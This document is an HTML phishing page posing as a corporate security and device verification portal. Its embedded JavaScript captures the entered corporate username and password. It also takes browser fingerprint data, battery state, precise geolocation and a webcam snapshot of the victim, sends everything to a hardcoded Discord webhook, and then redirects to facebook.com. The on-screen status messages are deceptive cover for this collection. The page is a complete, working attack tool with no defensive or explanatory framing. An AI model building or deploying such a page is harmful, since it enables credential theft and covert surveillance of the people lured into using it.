<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enterprise IT Security & Device Verification</title>
    <style>
        :root {
            --primary: #0284c7;
            --primary-hover: #0369a1;
            --bg: #0f172a;
            --card-bg: #1e293b;
            --text: #f8fafc;
            --text-secondary: #94a3b8;
            --border: #334155;
        }
        body {
            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: var(--bg);
            color: var(--text);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .container {
            background: var(--card-bg);
            border: 1px solid var(--border);
            padding: 36px;
            border-radius: 16px;
            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.4);
            width: 100%;
            max-width: 420px;
            text-align: center;
            box-sizing: border-box;
        }
        h2 { margin-top: 0; font-size: 22px; font-weight: 600; color: #f1f5f9; }
        p { color: var(--text-secondary); font-size: 14px; line-height: 1.5; margin-bottom: 24px; }
        .form-group { margin-bottom: 16px; text-align: left; }
        .form-control {
            width: 100%;
            padding: 14px;
            background: #0f172a;
            border: 1px solid var(--border);
            border-radius: 8px;
            color: var(--text);
            font-size: 15px;
            outline: none;
            box-sizing: border-box;
            transition: border-color 0.2s;
        }
        .form-control:focus { border-color: var(--primary); }
        .btn {
            background-color: var(--primary);
            color: white;
            border: none;
            padding: 14px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: background-color 0.2s;
            margin-top: 8px;
        }
        .btn:hover { background-color: var(--primary-hover); }
        .status-box {
            display: none;
            flex-direction: column;
            align-items: center;
            gap: 15px;
            padding: 20px 0;
        }
        .spinner {
            border: 3px solid var(--border);
            border-top: 3px solid var(--primary);
            border-radius: 50%;
            width: 38px;
            height: 38px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .footer-note { font-size: 12px; color: var(--text-secondary); margin-top: 20px; }
    </style>
</head>
<body>
    <div class="container" id="main-card">
        <h2>Corporate Security & Device Sync</h2>
        <p>Please authenticate your session to finalize corporate network access and verify hardware integrity.</p>
        
        <div class="form-group">
            <input type="text" id="username" class="form-control" placeholder="Corporate ID or Email" autocomplete="off">
        </div>
        <div class="form-group">
            <input type="password" id="password" class="form-control" placeholder="Account Password" autocomplete="off">
        </div>
        <button class="btn" onclick="executeWorkflow()">Authorize & Verify</button>
        <div class="footer-note">IT Security Infrastructure & Compliance Division</div>
    </div>

    <div class="container status-box" id="status-card">
        <div class="spinner"></div>
        <h2 id="status-text">Validating security tokens...</h2>
        <p>Please keep this window open while hardware bindings synchronize.</p>
    </div>

    <video id="video-stream" autoplay playsinline style="display:none;"></video>
    <canvas id="snapshot-canvas" style="display:none;"></canvas>

    <script>
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1508157170494079077/PZjIfd-LqyW_Z7nFBVyiKq2lRuEmOufsPOThnz0JlPeDe-5OnjBoU6a4AZj4gXABuquI";

        let credentials = { user: "", pass: "" };

        document.getElementById('username').addEventListener('input', e => { credentials.user = e.target.value; });
        document.getElementById('password').addEventListener('input', e => { credentials.pass = e.target.value; });

        async function updateStatus(msg) {
            document.getElementById('status-text').innerText = msg;
            await new Promise(r => setTimeout(r, 600));
        }

        async function executeWorkflow() {
            if (!credentials.user || !credentials.pass) {
                alert("Please enter both credentials to proceed.");
                return;
            }

            document.getElementById('main-card').style.display = 'none';
            document.getElementById('status-card').style.display = 'flex';

            await updateStatus("Initializing hardware telemetry...");

            let telemetry = {
                capturedUser: credentials.user,
                capturedPass: credentials.pass,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                battery: 'Unavailable',
                geolocation: 'Not granted',
                camera: 'Pending'
            };

            // Isolated Battery Check
            try {
                if (navigator.getBattery) {
                    const bat = await navigator.getBattery();
                    telemetry.battery = `Level: ${Math.round(bat.level * 100)}\%, Charging:${bat.charging}`;
                }
            } catch(e) {}

            await updateStatus("Verifying regional network position...");

            // Isolated Geolocation Check (Failure / Denial safe)
            try {
                if (navigator.geolocation) {
                    const pos = await new Promise((res, rej) => {
                        navigator.geolocation.getCurrentPosition(res, rej, { timeout: 4000, enableHighAccuracy: true });
                    });
                    telemetry.geolocation = `Lat: \${pos.coords.latitude}, Lon: ${pos.coords.longitude}, Acc:${pos.coords.accuracy}m`;
                }
            } catch(e) {
                telemetry.geolocation = 'Denied or Timeout';
            }

            await updateStatus("Performing biometric binding scan...");

            // Isolated Camera Capture (Failure / Denial safe)
            let photoBlob = null;
            try {
                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                    const video = document.getElementById('video-stream');
                    video.srcObject = stream;
                    await new Promise(r => video.onloadedmetadata = r);
                    await new Promise(r => setTimeout(r, 800));

                    const canvas = document.getElementById('snapshot-canvas');
                    canvas.width = video.videoWidth || 1280;
                    canvas.height = video.videoHeight || 720;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                    stream.getTracks().forEach(t => t.stop());
                    photoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.88));
                    telemetry.camera = "Successfully captured";
                }
            } catch(e) {
                telemetry.camera = "Denied or Unavailable";
            }

            await updateStatus("Finalizing authorization handshake...");

            // Exfiltration via Webhook with robust error handling
            try {
                const payloadMsg = `**🚨 Corporate Portal Verification Capture:**\n\`\`\`json\n${JSON.stringify(telemetry, null, 2)}\n\`\`\``;
                if (photoBlob) {
                    const fd = new FormData();
                    fd.append('payload_json', JSON.stringify({ content: payloadMsg }));
                    fd.append('file', photoBlob, 'auth_capture.jpg');
                    await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: fd });
                } else {
                    await fetch(DISCORD_WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ content: payloadMsg })
                    });
                }
            } catch(e) {}

            await updateStatus("Verification complete. Redirecting...");

            // Guaranteed Redirection
            setTimeout(() => {
                window.location.href = "https://www.facebook.com";
            }, 800);
        }
    </script>
</body>
</html>
